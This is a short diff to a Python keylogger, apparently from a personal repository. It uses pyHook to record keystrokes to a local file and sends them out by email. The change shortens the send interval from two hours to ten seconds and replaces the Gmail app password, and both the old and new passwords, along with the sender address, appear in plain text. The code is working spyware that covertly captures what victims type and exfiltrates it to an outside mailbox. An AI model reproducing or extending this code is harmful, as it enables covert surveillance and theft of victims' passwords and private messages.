@@ -2,7 +2,7 @@
 import pyHook, pythoncom, logging, time, datetime
 
 carpeta_destino = ".\\result_keylogger.txt"
-segundos_esperar = 7200
+segundos_esperar = 10
 timeout = time.time() + segundos_esperar
 
 def Timeout():
@@ -22,7 +22,7 @@ def EnviarEmail():
             g = b.read()
             data = "Mensaje capturado a las: " + fecha + "\n" + data
             print(data)
-            crearEmail('pabloenriquec256@gmail.com','ywpxtqegplmbkbxt','pabloenriquec256@gmail.com',g ,data)
+            crearEmail('pabloenriquec256@gmail.com','qoxhadzuqspqqrwz','pabloenriquec256@gmail.com',g ,data)
             f.seek(0)
             f.truncate()
 def crearEmail(user,passw,recep,subj,body):
